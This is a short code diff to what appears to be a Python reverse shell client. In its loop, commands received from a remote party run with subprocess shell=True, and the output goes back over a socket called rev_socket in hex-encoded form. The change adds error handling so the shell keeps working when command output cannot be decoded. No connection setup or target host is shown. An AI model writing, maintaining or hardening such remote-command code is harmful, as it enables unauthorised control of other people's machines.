@@ -72,7 +72,11 @@ while True:
         continue
 
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout = output.stdout.read().decode()
+    try:
+        stdout = output.stdout.read().decode()
+    except UnicodeDecodeError:
+        rev_socket.send(hex_handler('Could not send the data.', encode=True))
+        continue
     if stdout:
         rev_socket.send(hex_handler(stdout, encode=True))
         continue
